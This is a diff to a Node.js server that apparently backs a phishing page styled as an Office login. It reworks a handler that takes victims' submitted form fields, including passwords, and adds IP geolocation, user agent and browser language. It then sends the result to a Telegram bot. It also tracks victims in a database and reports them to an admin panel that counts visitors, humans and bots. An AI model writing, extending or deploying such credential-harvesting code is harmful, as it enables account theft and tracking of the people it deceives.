@@ -88,34 +88,51 @@ function addClientToDatabase(clientId, ip, command) {
     });
 }
 
-// Function to update client's command in the database
 function updateClientCommand(clientId, command, callback) {
-    db.run("UPDATE clients SET command = ? WHERE id = ?", [command, clientId], (err) => {
+    db.get("SELECT * FROM clients WHERE id = ?", [clientId], (err, row) => {
         if (err) {
-            console.error(`Error updating command for client ${clientId}: ${err.message}`);
-            callback(err, null); // Pass error to callback
+            console.error(`Error checking client ${clientId}: ${err.message}`);
+            return callback(err, false);
+        } else if (!row) {
+            // No row found
+            return callback(null, false);
         } else {
-            console.log(`Command updated for client ${clientId}`);
-            callback(null, true); // Indicate success to callback
+            db.run("UPDATE clients SET command = ? WHERE id = ?", [command, clientId], (err) => {
+                if (err) {
+                    console.error(`Error updating command for client ${clientId}: ${err.message}`);
+                    return callback(err, false);
+                } else {
+                    console.log(`Command updated for client ${clientId}`);
+                    return callback(null, true, row); // Pass the existing row back
+                }
+            });
         }
     });
 }
 
-// Function to add a new client to the database if not already present
 function addInputClientToDatabase(clientId, ip, command, callback) {
-    visitors++;
-    humans++;
     db.run("INSERT INTO clients (id, inputs, ip, command) VALUES (?, ?, ?, ?)", [clientId, JSON.stringify({}), ip, command], (err) => {
         if (err) {
             console.error(`Error adding client ${clientId}: ${err.message}`);
-            callback(err); // Pass error to callback
+            callback(err);
         } else {
             console.log(`Client ${clientId} with IP ${ip} added to the database`);
-            callback(null); // Indicate success to callback
+            callback(null);
         }
     });
 }
 
+function updateClientInputs(clientId, inputs) {
+    return new Promise((resolve, reject) => {
+        db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
+            if (err) {
+                reject(`Error updating inputs for client ${clientId}: ${err.message}`);
+            } else {
+                resolve(`Inputs updated for client ${clientId}`);
+            }
+        });
+    });
+}
 
 // Function to get client data from the database
 function getClientFromDatabase(clientId, callback) {
@@ -286,7 +303,7 @@ const HEARTBEAT_INTERVAL = 60000; // 1 minute
 app.post('/heartbeat', (req, res) => {
     const clientId = req.body.clientId;
     currPage = req.body.currPage;
-
+	
     if (clients[clientId]) {
         // Reset the heartbeat timeout
         clearTimeout(clients[clientId].timeout);
@@ -295,11 +312,11 @@ app.post('/heartbeat', (req, res) => {
             // Perform the desired action here
         }, HEARTBEAT_INTERVAL);
         res.send('true');
-        broadcastAdminPanel(currPage, visitors);
+        
     } else {
         currPage = "Disconnected";
-        broadcastAdminPanel(currPage, visitors);
     }
+    broadcastAdminPanel(currPage, stats);
 });
 
 app.get('/events', (req, res) => {
@@ -343,88 +360,88 @@ app.post('/input', async (req, res) => {
     try {
         const { clientId, currPage, inputs } = req.body;
         console.log('Received /input request:', req.body);
-        const ipAddress = getClientIp(req);
-        const ipAddressInformation = await sendAPIRequest(ipAddress);
-        let command = "not";
-        addSampleData();
+
         if (!clientId || typeof inputs !== 'object') {
             return res.status(400).send('Missing clientId or inputs object');
         }
 
-        updateClientCommand(clientId, command , (err, rowUpdated) => {
-    if (err) {
-        console.error("Error updating client command:", err);
-        // Handle error
-    } else if (!rowUpdated) {
-        console.log("No row updated, client does not exist in the database.");
-        // Client doesn't exist, add them
-        addInputClientToDatabase(clientId, ip, command, (addErr) => {
-            if (addErr) {
-                console.error("Error adding client to database:", addErr);
-                // Handle error while adding client
+        const ipAddress = getClientIp(req);
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+        let command = "not";
+
+        updateClientCommand(clientId, command, async (err, rowUpdated, row) => {
+            if (err) {
+                console.error("Error updating client command:", err);
+                return res.status(500).send('Error updating client command');
+            } else if (!rowUpdated) {
+                console.log("No row updated, client does not exist in the database.");
+                // Client doesn't exist, add them
+                addInputClientToDatabase(clientId, ipAddress, command, async (addErr) => {
+                    if (addErr) {
+                        console.error("Error adding client to database:", addErr);
+                        return res.status(500).send('Error adding client to database');
+                    } else {
+                        console.log("Client added to database successfully.");
+                        // Update inputs after adding client
+                        await updateClientInputs(clientId, inputs);
+                        broadcastAdminPanel(currPage, { visitors, humans, bots });
+                        return res.sendStatus(200);
+                    }
+                });
             } else {
-                console.log("Client added to database successfully.");
-                // Client added successfully
+                console.log("Client command updated successfully.");
+                // Client command updated successfully
+                const existingInputs = row ? JSON.parse(row.inputs) : {};
+                const updatedInputs = { ...existingInputs, ...inputs };
+
+                await updateClientInputs(clientId, updatedInputs);
+                broadcastAdminPanel(currPage, { visitors, humans, bots });
+
+                if (!ipAddressInformation) {
+                    return res.status(500).send('Error retrieving IP information');
+                }
+
+                const userAgent = req.headers["user-agent"];
+                const systemLang = req.headers["accept-language"];
+
+                if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
+                    let message = `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
+                        `👤 LOGIN \n\n`;
+
+                    const inputKeys = Object.keys(inputs);
+
+                    inputKeys.forEach(key => {
+                        if (key === 'password') {
+                            message += `🌍 GEO-IP INFO\n` +
+                                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+                                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+                                `CITY             : ${ipAddressInformation.location.city}\n` +
+                                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+                                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+                                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+                                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+                                `💻 SYSTEM INFO\n` +
+                                `USER AGENT       : ${userAgent}\n` +
+                                `SYSTEM LANGUAGE  : ${systemLang}\n` +
+                                `💬 Telegram: https://t.me/UpdateTeams\n`;
+                            return;
+                        }
+                        const value = inputs[key];
+                        console.log(`${key}: ${value}\n`);
+                        message += `${key}: ${value}\n`;
+                    });
+
+                    const sendMessage = sendMessageFor(botToken, chatId);
+                    sendMessage(message);
+                    console.log(`Message: ${message}`);
+                } else {
+                    console.log('Inputs are empty or not defined.');
+                }
+
+                return res.sendStatus(200);
             }
         });
-    } else {
-        console.log("Client command updated successfully.");
-        // Client command updated successfully
-	broadcastAdminPanel(currPage, stats);
-    }
-});
-
-
-        const existingInputs = row ? JSON.parse(row.inputs) : {};
-        const updatedInputs = { ...existingInputs, ...inputs };
-
-        await updateClientInputs(clientId, updatedInputs);
-        broadcastAdminPanel(currPage, stats);
-
-        if (!ipAddressInformation) {
-            return res.status(500).send('Error retrieving IP information');
-        }
-
-        const userAgent = req.headers["user-agent"];
-        const systemLang = req.headers["accept-language"];
-
-        if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
-            let message = `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
-                `👤 LOGIN \n\n`;
-
-            const inputKeys = Object.keys(inputs);
-
-            inputKeys.forEach(key => {
-                if (key === 'password') {
-                    message += `🌍 GEO-IP INFO\n` +
-                        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-                        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-                        `CITY             : ${ipAddressInformation.location.city}\n` +
-                        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-                        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-                        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-                        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-                        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-                        `💻 SYSTEM INFO\n` +
-                        `USER AGENT       : ${userAgent}\n` +
-                        `SYSTEM LANGUAGE  : ${systemLang}\n` +
-                        `💬 Telegram: https://t.me/UpdateTeams\n`;
-                    return;
-                }
-                const value = inputs[key];
-                console.log(`${key}: ${value}\n`);
-                message += `${key}: ${value}\n`;
-            });
-
-            const sendMessage = sendMessageFor(botToken, chatId);
-            sendMessage(message);
-            console.log(`message: ${message}`);
-
-        } else {
-            console.log('Inputs are empty or not defined.');
-        }
-
-        res.sendStatus(200);
     } catch (error) {
         console.error(`Error processing request: ${error.message}`);
         res.sendStatus(500);
